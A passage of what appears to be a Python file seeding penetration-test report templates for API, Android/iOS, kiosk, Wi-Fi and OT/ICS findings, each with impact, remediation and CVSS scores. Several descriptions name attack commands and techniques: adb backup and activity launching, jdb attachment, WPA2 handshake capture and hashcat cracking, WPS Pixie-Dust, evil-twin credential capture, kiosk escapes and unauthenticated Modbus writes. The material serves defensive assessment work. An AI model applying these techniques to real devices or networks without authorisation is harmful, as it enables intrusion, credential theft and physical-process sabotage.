            remediation="- Define a per-endpoint output schema that explicitly lists which fields to expose. Never serialise the raw DB model.\n- Use a typed DTO / serializer / Pydantic response model with `from_attributes=True` plus an explicit allow-list of fields.\n- Add a unit test that asserts the response of every sensitive endpoint matches the expected schema (no extra keys).",
            references="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/\nhttps://cwe.mitre.org/data/definitions/213.html",
            cwe="CWE-213", owasp="API3:2023",
            cvss_score=6.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("api_vapt", "Unsafe Consumption of Third-Party APIs", "Medium",
            description="The application calls a partner API (`https://partner.example.com/score`) and embeds the response into its own UI / downstream logic without validation. If the partner is compromised or returns unexpected data, the bug surface propagates — a malicious response containing `<script>` lands in an HTML sink; a numeric field returning `\"unlimited\"` instead of a number crashes downstream business logic.",
            impact="Supply-chain risk that bypasses the application's own input-validation perimeter — the data didn't come from a user, so trust assumptions were skipped. Recent breaches (Codecov, MOVEit, etc.) demonstrate this is one of the dominant paths to compromise.",
            remediation="- Treat third-party API responses with the same validation rigour as user input. Encode at sinks, type-check, range-check.\n- TLS-verify and pin certificates for upstream third-party calls.\n- Set a strict timeout AND response-size cap on every outbound HTTP call.\n- Sandbox third-party data in the consumer (separate DB schema, separate microservice, no transitive trust).",
            references="https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/",
            cwe="CWE-20", owasp="API10:2023",
            cvss_score=6.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:N"),
    ])

    # ---- Mobile (deeper coverage) ----------------------------------
    F.extend([
        _f("mobile_pt", "Android `android:allowBackup=\"true\"` Enabled", "Medium",
            description="The application's `AndroidManifest.xml` either explicitly sets `android:allowBackup=\"true\"` or relies on the pre-Android-12 default (which was `true`). Running `adb backup -f app.ab -apk -noshared <pkg>` on a debug-enabled phone produces a complete backup of the app's private storage — including `databases/`, `shared_prefs/`, and cached files — without root.",
            impact="An attacker with brief physical / ADB access can clone every file inside the app sandbox: session tokens, cached PII, encrypted-but-locally-keyed DB blobs. Combined with hardcoded encryption keys in the APK (a frequent paired finding) this leads to full plaintext recovery off-device.",
            remediation="- Set `android:allowBackup=\"false\"` in the manifest for production builds, OR\n- Define a strict `android:fullBackupContent` / `android:dataExtractionRules` XML that excludes every directory holding sensitive material.\n- Target API 31+ (Android 12) where the default flips, but still set the value explicitly for older OS versions.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/\nhttps://developer.android.com/guide/topics/data/autobackup",
            cwe="CWE-530", owasp="M2: Insecure Data Storage",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Android — Exported Activity / Service / Content Provider Without Permission", "High",
            description="The manifest declares `<activity android:name=\".AdminActivity\" android:exported=\"true\" />` (or `provider` / `service` / `receiver`) without an `android:permission` attribute. Running `adb shell am start -n <pkg>/.AdminActivity` from a different installed app launches the activity directly, bypassing the app's normal launcher / authentication flow.",
            impact="Any malicious app installed on the device can invoke the exported component and reach functionality the developer assumed was guarded by the in-app navigation (admin screens, IPC-internal endpoints, file pickers that grant `Uri.permission.READ_URI_PERMISSION`).",
            remediation="- Audit every `<activity|service|provider|receiver>` and either set `android:exported=\"false\"` or guard it with a custom `android:permission` declared with `signature` protection level.\n- Validate any caller-supplied intent extras inside the component before acting on them — even with a permission, treat the caller as untrusted.\n- Use `getCallingPackage()` / `Binder.getCallingUid()` to audit caller identity on IPC-style services.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/\nhttps://cwe.mitre.org/data/definitions/926.html",
            cwe="CWE-926", owasp="M1: Improper Platform Usage",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Tapjacking / Overlay Attack (Android)", "Medium",
            description="The application's sensitive Activities (transfer-confirm, biometric-prompt, permission-grant) do not set `android:filterTouchesWhenObscured=\"true\"`. A second app holding `SYSTEM_ALERT_WINDOW` can render a transparent overlay on top of the target Activity; the user's taps are passed through to the underlying screen, confirming destructive actions the user didn't intend.",
            impact="Silent confirmation of any action the legitimate app accepts via touch — money transfers, account deletions, permission grants — without the user perceiving any interaction with the target app.",
            remediation="- Set `android:filterTouchesWhenObscured=\"true\"` on every Activity that confirms destructive or high-impact actions.\n- On Android 12+, set `Window.setHideOverlayWindows(true)` for sensitive flows.\n- Detect overlay state at runtime via `Settings.canDrawOverlays` and warn the user / refuse the action when overlays are present.",
            references="https://developer.android.com/reference/android/view/View#filterTouchesWhenObscured\nhttps://cwe.mitre.org/data/definitions/1021.html",
            cwe="CWE-1021", owasp="M1: Improper Platform Usage",
            cvss_score=6.1,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Android Debug Build Released to Production", "Medium",
            description="The deployed APK is built with `android:debuggable=\"true\"` in the manifest (visible via `aapt dump xmltree <apk> AndroidManifest.xml`). Attaching `jdb -attach localhost:8700` after `adb forward tcp:8700 jdwp:<pid>` opens an interactive Java debugger against the running process on any non-rooted device — variables can be read, methods invoked, and code injected.",
            impact="Full process introspection and manipulation on any device the app runs on. Encryption keys, in-memory tokens, and the entire control flow are exposed to anyone with USB access.",
            remediation="- Ensure release builds set `android:debuggable=\"false\"`. Most build systems (Gradle) do this automatically for `release` flavour — never override in production.\n- Add a CI check that fails the build if `android:debuggable=\"true\"` is present in a release-flavour APK.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0044/\nhttps://cwe.mitre.org/data/definitions/489.html",
            cwe="CWE-489", owasp="M10: Extraneous Functionality",
            cvss_score=6.8,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "iOS — App Transport Security Disabled or Weakened", "Medium",
            description="`Info.plist` declares `NSAppTransportSecurity` with `NSAllowsArbitraryLoads = true` (global cleartext-allowed) or per-domain `NSExceptionAllowsInsecureHTTPLoads = true` for production hosts. The app makes plaintext HTTP requests against those hosts, defeating Apple's transport-security baseline.",
            impact="Network traffic to the affected hosts is observable / modifiable in cleartext by any attacker on the same network path — corporate proxies, public Wi-Fi, malicious access points.",
            remediation="- Remove `NSAllowsArbitraryLoads` from `Info.plist`. Where a single legacy host genuinely requires HTTP, narrow the exception via `NSExceptionDomains` with the exact hostname AND a documented sunset date.\n- Migrate every backend host to HTTPS with a current TLS configuration.\n- Pair with certificate pinning for production hosts (separate finding).",
            references="https://developer.apple.com/documentation/security/preventing_insecure_network_connections\nhttps://mas.owasp.org/MASTG/tests/ios/MASVS-NETWORK/MASTG-TEST-0064/",
            cwe="CWE-319", owasp="M3: Insecure Communication",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Insecure Local SQLite Storage (No Encryption)", "Medium",
            description="The app stores session tokens, KYC blobs, or chat history in an unencrypted SQLite database at `/data/data/<pkg>/databases/app.db` (Android) or `Library/Application Support/<bundle>/app.sqlite` (iOS). On a rooted / jailbroken device — or via an `adb backup` chain when `allowBackup` is on — the file is recoverable in plaintext.",
            impact="Sensitive content lives on disk in cleartext. Any path that yields file-level access to the sandbox (root, jailbreak, backup extraction, malware co-resident in the same userspace) reads it.",
            remediation="- Encrypt the SQLite file with a key sourced from the platform Keystore (Android Keystore + SQLCipher) / Secure Enclave (iOS SQLCipher / GRDB with passphrase).\n- Avoid storing sensitive data locally where you can — fetch on demand from the backend and hold it only in-memory for the screen's lifetime.\n- Encrypt at the column level for highly-sensitive fields even within an encrypted DB.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0012/\nhttps://www.zetetic.net/sqlcipher/",
            cwe="CWE-312", owasp="M2: Insecure Data Storage",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Sensitive Data Logged to Logcat / OSLog", "Low",
            description="Production logs at `adb logcat` (Android) / `Console.app` (iOS) carry sensitive content the app prints during normal operation: full request bodies including auth tokens, customer NRIC / national IDs, OTP values, and stack traces with file paths. Logcat retains the last ~256 KiB of logs per buffer for any app that holds `READ_LOGS` permission (some OEM ROMs grant this freely to system apps).",
            impact="On rooted devices, logcat is freely readable. On enterprise-managed devices, MDM agents often forward logs to a central SIEM that the consultant may not realise is collecting sensitive PII. Crash reporting tools (Crashlytics, Sentry) frequently capture nearby log lines.",
            remediation="- Strip / redact every sensitive value at the logging layer. Apply at the framework's logging middleware so every callsite benefits.\n- In release builds, compile out verbose logging via build-flavour conditionals (`if (BuildConfig.DEBUG)` Java/Kotlin; `#if DEBUG` Swift).\n- Use Timber (Android) with a no-op tree in release flavour.\n- Audit crash-report SDKs for which fields they capture and configure data-scrubbing rules.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0007/\nhttps://cwe.mitre.org/data/definitions/532.html",
            cwe="CWE-532", owasp="M2: Insecure Data Storage",
            cvss_score=4.4,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Custom URL Scheme / Deep Link Hijacking", "Medium",
            description="The app registers `myapp://` as a URL scheme without verifying the originator of intents/universal-links. Any other app on the device can register the same scheme — Android picks one (in some cases via a chooser the user blindly accepts). On iOS, the most-recently-installed app handling the scheme wins.\n\nWhen the legitimate flow includes `myapp://oauth/callback?code=…&state=…` the hijacking app intercepts the OAuth authorization code and completes the flow as the victim.",
            impact="OAuth code interception → account takeover, especially in flows lacking PKCE. Sensitive data passed via the URL (tokens, file references, magic-login links) leaks to the hostile co-resident app.",
            remediation="- Migrate from custom URL schemes to **Android App Links** / **iOS Universal Links**, which the OS verifies against a `.well-known/assetlinks.json` or `apple-app-site-association` file served from the app's authorised domain. Hijacking becomes impossible.\n- Always require PKCE in OAuth flows; the authorisation code is then useless without the original code-verifier.\n- Inspect `Intent.getData()` source / sender and reject untrusted callers.",
            references="https://developer.android.com/training/app-links\nhttps://developer.apple.com/documentation/Xcode/supporting-universal-links-in-your-app\nhttps://cwe.mitre.org/data/definitions/940.html",
            cwe="CWE-940", owasp="M1: Improper Platform Usage",
            cvss_score=6.9,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Insecure Use of Biometric Authentication", "Medium",
            description="The application uses the platform biometric API (`BiometricPrompt` / `LAContext`) as a pure UI control — `if (auth_success) { showAuthenticatedScreen(); }`. There's no cryptographic operation bound to the biometric outcome. A repackaged APK can patch the `if` branch to always evaluate `true`; on iOS the same patch is applied via Frida hooks.",
            impact="Bypass of the biometric gate on rooted/jailbroken devices or via tampered binaries. The biometric prompt becomes security theatre — a UI element that any local attacker can sidestep.",
            remediation="- Bind the biometric outcome to a keystore-backed cryptographic operation. Android: create a `KeyGenParameterSpec` with `setUserAuthenticationRequired(true)` and use it inside `BiometricPrompt.CryptoObject`. iOS: store the secret in the Keychain with `kSecAccessControlBiometryCurrentSet`.\n- Without a biometric authentication, the cryptographic operation fails — no application-side `if` can be patched around it.\n- For high-risk operations, require a server-side step that the biometric-protected key has signed.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/\nhttps://developer.apple.com/documentation/localauthentication",
            cwe="CWE-287", owasp="M4: Insecure Authentication",
            cvss_score=5.7,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("mobile_pt", "Improper Input Validation in WebView (file:// / content:// Schemes)", "Medium",
            description="The app's WebView allows arbitrary navigation via `webView.loadUrl(url)` where `url` is partly user-controlled (e.g. from a deep link). A crafted URL of `file:///data/data/<pkg>/databases/app.db` loads the app's private database into the WebView; with `setAllowFileAccess(true)` and `setAllowFileAccessFromFileURLs(true)` it can be exfiltrated via JavaScript to a remote endpoint.",
            impact="Reads of the app's own private files via a WebView with overly permissive `file://` access — recover databases, shared-preferences, and any other content the app has stored.",
            remediation="- Disable file-scheme access: `setAllowFileAccess(false)`, `setAllowFileAccessFromFileURLs(false)`, `setAllowUniversalAccessFromFileURLs(false)`.\n- Restrict the WebView's allowed URL space to a hard-coded host list, enforced in `shouldOverrideUrlLoading`.\n- Use `WebViewClient` to inspect every navigation, including embedded redirects.",
            references="https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0035/",
            cwe="CWE-749",
            cvss_score=6.6,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- Kiosk Penetration Testing ---------------------------------
    F.extend([
        _f("kiosk_pt", "Kiosk Browser Lockdown Bypass via Keyboard Shortcut", "High",
            description="The kiosk presents a single-purpose web UI in fullscreen. Pressing keyboard combinations not handled by the app — `Ctrl+O` (Open File), `Ctrl+P` (Print), `F11`, `Alt+F4`, `Win`+typing — yields a native dialog (file picker, print preview, taskbar) that allows navigation outside the kiosk shell and, in several cases, browsing the underlying filesystem.",
            impact="Escape from the kiosk's intended UI and access to the host operating system. From there an attacker can reach the C: drive, dump SAM hives from a privileged process, or pivot via the device's network connection.",
            remediation="- Disable every keyboard shortcut that opens a privileged dialog. On Windows kiosks, use Group Policy to restrict File Open / Print / Run dialogs system-wide and run the kiosk shell under a sandboxed AppLocker policy.\n- On Linux kiosk shells, use a hardened display manager (Cage, Magpie) that doesn't expose Alt+F2 / Ctrl+Alt+T / virtual-terminal switching.\n- Validate the lockdown with an automated keyboard-fuzzing test that walks the full set of Ctrl/Alt/Meta combinations and watches for non-app windows appearing.",
            references="https://owasp.org/www-community/attacks/Kiosk_Exposure_Risks",
            cwe="CWE-693",
            cvss_score=7.7,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Kiosk URL-Bar / Navigation Lockdown Bypass", "High",
            description="The kiosk shell hides the browser's address bar and forward/back buttons but the underlying browser (Chrome --kiosk, Edge --fullscreen) accepts `chrome://`, `file://`, and `view-source:` URLs entered via crafted JavaScript bookmark, drag-and-drop of a `.url` file, or by interacting with a browser extension whose UI was left visible.",
            impact="Arbitrary URL navigation defeats the kiosk's allow-list. Once the browser can reach `file://C:/Windows/System32/`, the kiosk session is effectively a generic Windows shell.",
            remediation="- Deploy a managed browser policy (Chrome `URLAllowlist` / `URLBlocklist`, Edge enterprise policies) that restricts the kiosk to a small allow-list of hosts.\n- Disable file URL handling (`AllowFileSelectionDialogs=false`, `AllowFileURL=false`).\n- Disable extensions in the kiosk profile.\n- Force-install the kiosk extension and remove all others.",
            references="https://chromeenterprise.google/policies/",
            cwe="CWE-284",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Print-to-File Used to Reach Filesystem", "Medium",
            description="Triggering print (Ctrl+P or an intentional Print button inside the kiosk web app) opens the OS print dialog, where the destination 'Microsoft Print to PDF' / 'Save as PDF' produces a Save File dialog. That dialog is a fully functional file browser — the attacker browses C:\\Users\\, navigates filesystem locations, copies files via context menus.",
            impact="Filesystem disclosure + arbitrary file write. On Windows the Save dialog also exposes the right-click context menu (Open in File Explorer, run as administrator on selected paths) — a common kiosk escape.",
            remediation="- Disable printing entirely on kiosk endpoints that don't legitimately need it (`Devices and Printers` removed via GPO; browser policy `PrintingEnabled=false`).\n- If printing is required, restrict the print destination to a single network printer with no Save-to-PDF option.\n- Run the kiosk shell as a constrained user that has no read access to the rest of the filesystem.",
            references="https://learn.microsoft.com/en-us/deployedge/microsoft-edge-policies",
            cwe="CWE-552",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Missing Idle / Session Lockout", "Medium",
            description="The kiosk web session remains authenticated indefinitely after the previous user walks away. There is no inactivity timer, no auto-logout, and no \"finish session\" button that resets state. The next user inherits the previous user's full session: cart contents, account access, queued transactions.",
            impact="Cross-user data leakage and unintended actions performed against the previous user's account. For payment / KYC kiosks this is a regulated-data exposure event.",
            remediation="- Implement a client-side idle timer (typically 30-120 seconds of inactivity) that wipes session state, returns to the splash screen, and rotates any cached session token.\n- Pair with a server-side absolute lifetime on the session (e.g. 5 minutes maximum).\n- Provide a prominent \"Finish session\" / \"Start over\" button on every screen.",
            references="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration",
            cwe="CWE-613",
            cvss_score=5.6,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Kiosk Runs as Administrator / Privileged User", "High",
            description="The kiosk shell process is launched under an account with administrative rights (verified via `whoami /groups` from a kiosk-escape shell). Any successful escape from the kiosk UI inherits administrator privileges immediately.",
            impact="Escape-to-admin is collapsed into escape: every other kiosk finding becomes one-step compromise. UAC, AppLocker, and other least-privilege mitigations are bypassed.",
            remediation="- Run the kiosk shell under a dedicated, least-privileged local user account.\n- Apply Windows Assigned Access (kiosk mode) to bind the user account to a single UWP/Edge app.\n- Use AppLocker / Windows Defender Application Control to whitelist only the kiosk binary.\n- Remove the kiosk account from `Administrators`, `Power Users`, and `Remote Desktop Users`.",
            references="https://learn.microsoft.com/en-us/windows/configuration/kiosk-single-app\nhttps://cwe.mitre.org/data/definitions/272.html",
            cwe="CWE-272",
            cvss_score=8.4,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "USB Auto-Run / Mass-Storage Mounted Automatically", "Medium",
            description="Inserting a USB drive into the kiosk causes Windows AutoPlay to display, allowing the inserted device's files to be browsed via Explorer. On Linux kiosks, the automounter mounts the device read-write under `/media/<user>/`.",
            impact="Direct read/write to whatever the inserted media contains — typically attacker-supplied tools and exfiltration scripts. On older Windows kiosks, AutoRun.inf can directly execute a binary.",
            remediation="- Disable AutoPlay system-wide via GPO (`Computer Configuration → Administrative Templates → Windows Components → AutoPlay Policies → Turn off AutoPlay = Enabled, All drives`).\n- Block mass-storage devices entirely (`Allow installation of devices that match any of these device IDs` set to empty + `Prevent installation of devices using drivers that match these device setup classes` configured for the `{36FC9E60-C465-11CF-8056-444553540000}` USB controller class).\n- On Linux, set `udisks2` policy to require admin authorisation for mounting.\n- Physically fill / cap unused USB ports.",
            references="https://attack.mitre.org/techniques/T1091/",
            cwe="CWE-693",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Browser Developer Tools / Right-Click Menu Available", "Low",
            description="Right-clicking inside the kiosk's web UI opens the browser context menu, exposing `Inspect element`, `View source`, `Open link in new tab`, and `Save link as`. F12 opens DevTools. The attacker reads the page's source, modifies form values via the console, or navigates to internal URLs.",
            impact="Source disclosure, client-side authorisation bypass (the attacker mutates a hidden form field), and access to URLs the menu would otherwise hide.",
            remediation="- Disable DevTools via browser policy (`DeveloperToolsAvailability=2`).\n- Suppress the context menu in the kiosk page (`document.addEventListener('contextmenu', e => e.preventDefault())`) AS DEFENCE IN DEPTH — never as the primary control.\n- For Edge / Chrome, use `--disable-features=DeveloperTools` on the launch command.",
            references="https://chromeenterprise.google/policies/#DeveloperToolsAvailability",
            cwe="CWE-200",
            cvss_score=3.7,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("kiosk_pt", "Default / Maintenance Credentials Reachable Without Authentication", "High",
            description="The kiosk hardware vendor's maintenance menu is reachable by holding a key during boot (Touchscreen vendors often use a five-finger long-press) or by typing a default service PIN (`12345`, `0000`, vendor name) into a hidden input. The menu exposes network configuration, application logs, and a shell.",
            impact="Vendor-default credentials give an unauthenticated physical attacker administrator-level control of the device, including network reconfiguration to pivot inside the deployment's internal network.",
            remediation="- Change every vendor default credential before deploying. Document the change in the deployment runbook so it's not forgotten on the next refresh.\n- Disable maintenance menus on devices in customer-facing locations; require physical opening of the chassis to access them.\n- Configure the kiosk to require a per-device credential (driven by a central management server) rather than a vendor static value.",
            references="https://cwe.mitre.org/data/definitions/1392.html",
            cwe="CWE-1392",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
    ])

    # ---- Wi-Fi PT --------------------------------------------------
    F.extend([
        _f("wifi_pt", "Weak WPA2-PSK Pre-Shared Key", "High",
            description="The corporate guest / IoT network uses WPA2-PSK with a static pre-shared key. A passive 4-way-handshake capture (`airodump-ng wlan0`) yields a `.pcap`; offline cracking with `hashcat -m 22000` against the `rockyou` wordlist recovers the key in under 4 hours (PSK was `Welcome2026!`).",
            impact="Full Layer-2 access to the affected SSID, including the ability to deauthenticate other clients and intercept their re-association handshakes. Once on the segment, an attacker can probe internal services, ARP-poison, and pivot.",
            remediation="- Migrate the SSID to WPA2/WPA3-Enterprise with 802.1X (EAP-TLS preferred; EAP-PEAP/MSCHAPv2 acceptable only with strong passwords).\n- Where PSK must remain, rotate to a 25+ character random passphrase AND set the SSID hidden flag is NOT a control (broadcast or not, the handshake is capturable).\n- Run periodic deauth + crack-time monitoring to validate the PSK still resists known wordlists.",
            references="https://www.kb.cert.org/vuls/id/871675\nhttps://cwe.mitre.org/data/definitions/521.html",
            cwe="CWE-521",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("wifi_pt", "WPS Enabled (Pixie-Dust / PIN Brute-Force)", "High",
            description="The access point exposes Wi-Fi Protected Setup; `reaver` / `wash` confirms the WPS PIN is reachable. Vulnerable router chipsets (Realtek, Broadcom older firmware) yield the PIN in seconds via the Pixie-Dust offline attack against the M1/M2 messages.",
            impact="The 8-digit WPS PIN derives the WPA passphrase. Successful crack equals full PSK recovery without ever capturing a 4-way handshake.",
            remediation="- Disable WPS on every access point (`wireless wps no` on Cisco; WPS Disabled in consumer-AP web UIs).\n- Replace AP firmware with a current version where WPS is hardened (mandatory rate-limiting, no Pixie-Dust).\n- Audit periodically: `wash -i wlan0mon` should return no WPS-enabled BSSIDs.",
            references="https://www.kb.cert.org/vuls/id/723755\nhttps://hashcat.net/wiki/doku.php?id=mode_22000",
            cwe="CWE-308",
            cvss_score=8.0,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"),

        _f("wifi_pt", "Open / WEP / WPA1 Network Still in Service", "Critical",
            description="An SSID broadcast by the audited infrastructure runs in Open mode (no encryption) or WEP / WPA1 with TKIP. The traffic is decryptable in real time using a basic Aircrack-ng setup.",
            impact="Every packet on the affected SSID is readable and modifiable by a passive attacker within range. For corporate networks this is a guaranteed credential-leak surface.",
            remediation="- Decommission every Open / WEP / WPA1 SSID immediately.\n- Where legacy IoT clients can't speak WPA2-PSK, isolate them to a dedicated VLAN with no route to corporate / payment networks.\n- Replace devices that genuinely cannot support modern encryption.",
            references="https://www.aircrack-ng.org/doku.php\nhttps://cwe.mitre.org/data/definitions/326.html",
            cwe="CWE-326",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"),

        _f("wifi_pt", "Evil-Twin AP / Captive Portal Cloning", "High",
            description="Standing up an access point with the same SSID + similar BSSID + a stronger transmit power than the legitimate AP causes a percentage of clients (especially Windows / Android with auto-connect) to associate to the rogue AP. A captive-portal page mimicking the corporate login captures credentials.",
            impact="Credential harvest for any user whose device auto-connects, plus full MitM on their session for the duration of the connection. Corporate Wi-Fi networks routinely lose VPN / email / SaaS credentials to this technique.",
            remediation="- Deploy 802.1X with mutual authentication (EAP-TLS) — clients verify the RADIUS server's certificate, evil twins fail.\n- Disable the `Don't ask to connect to this network` auto-join on managed devices via MDM policy.\n- Run a Wireless Intrusion Detection System (Cisco CleanAir, Aruba AirWave) that alerts on duplicate SSIDs / BSSIDs in the airspace.\n- Educate users: corporate Wi-Fi should never ask them to log in via a captive portal that pops up on association.",
            references="https://attack.mitre.org/techniques/T1557/004/",
            cwe="CWE-300",
            cvss_score=7.8,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"),

        _f("wifi_pt", "Protected Management Frames (PMF / 802.11w) Disabled", "Medium",
            description="The access point's management frames (Beacon, Probe Request/Response, Auth, Deauth, Disassociation) are unsigned. A deauthentication-flood attack from an attacker within range disconnects every client repeatedly, denying service. The same primitive is the precondition for capturing 4-way handshakes for offline PSK cracking.",
            impact="Trivial denial of service on the entire SSID + enables the PSK-cracking attack chain. PMF / 802.11w is mandatory in WPA3; disabling it on a WPA3-capable network is a deliberate downgrade.",
            remediation="- Enable PMF (`wpa_pairwise=CCMP ieee80211w=2` on hostapd; PMF=Required on enterprise APs).\n- Deploy WPA3-Enterprise where the client base supports it — PMF is mandatory in the spec.\n- Audit AP configurations; some controllers default to PMF Optional, which is exploitable.",
            references="https://www.wi-fi.org/discover-wi-fi/security",
            cwe="CWE-693",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:N/SA:L"),

        _f("wifi_pt", "Client Isolation Disabled on Guest / IoT SSID", "Medium",
            description="The guest network's AP does not enforce client isolation. Once associated, an attacker can ARP-scan the segment (`nmap -PR 192.168.50.0/24`), reach every co-resident client's exposed services, and ARP-poison to MitM the traffic of other guest devices.",
            impact="Lateral movement between guest devices on the same SSID. Targets include unpatched personal laptops, smart speakers, printers, and any unmanaged endpoint that happens to be sharing the guest network.",
            remediation="- Enable AP/Wireless Client Isolation on every guest / IoT SSID (Cisco: `peer-blocking action drop`; Aruba: `peer-to-peer-blocking enable`; consumer APs: \"AP Isolation\" in the GUI).\n- Place IoT devices in a dedicated VLAN with no inter-client routing AND restricted egress.",
            references="https://documentation.meraki.com/MR/Firewall_and_Traffic_Shaping/Wireless_Client_Isolation",
            cwe="CWE-284",
            cvss_score=5.8,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("wifi_pt", "WPA3 Transition (SAE/PSK Mixed) Mode Downgrade Risk", "Medium",
            description="The SSID broadcasts in WPA3-Personal Transition mode (`AKM 00:0F:AC:08 + 00:0F:AC:02`) to support legacy devices. An attacker forces transition-mode clients to downgrade to WPA2-PSK by spoofing a WPA2-only AP at higher signal strength, then captures the 4-way handshake for offline cracking.",
            impact="The WPA3 SAE-protected dictionary-attack resistance is silently bypassed. If the PSK is weak, the network is compromised as if it were WPA2-only.",
            remediation="- Once the client base has fully migrated, disable Transition mode and require WPA3-only (`sae` AKM, no PSK fallback).\n- Where transition mode must persist, ensure the PSK is long-and-random enough to resist a WPA2 dictionary attack.\n- Monitor for rogue WPA2-only impersonators in the airspace via WIDS.",
            references="https://www.wi-fi.org/file/wpa3-specification\nhttps://wpa3.mathyvanhoef.com/",
            cwe="CWE-310",
            cvss_score=6.8,
            cvss_vector="CVSS:4.0/AV:A/AC:H/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- OT / ICS VAPT ---------------------------------------------
    F.extend([
        _f("ot_vapt", "Modbus / DNP3 / S7 Protocol Without Authentication", "Critical",
            description="The audited PLC accepts Modbus/TCP function codes from any host that can reach TCP/502. Sending `Write Single Coil` / `Write Multiple Registers` directly via `pymodbus` flips physical outputs (valves, motor contactors) without any credential challenge. The same is true for DNP3 (no Secure Authentication v5) and Siemens S7 (`ISO-on-TCP/102`) on most legacy deployments.",
            impact="Direct remote-control of the industrial process. Depending on the asset: motor over-speed, valve open-on-empty-tank, pump cavitation, safety-system override. Documented attacks have caused physical damage (Stuxnet, Triton/TRISIS, Industroyer).",
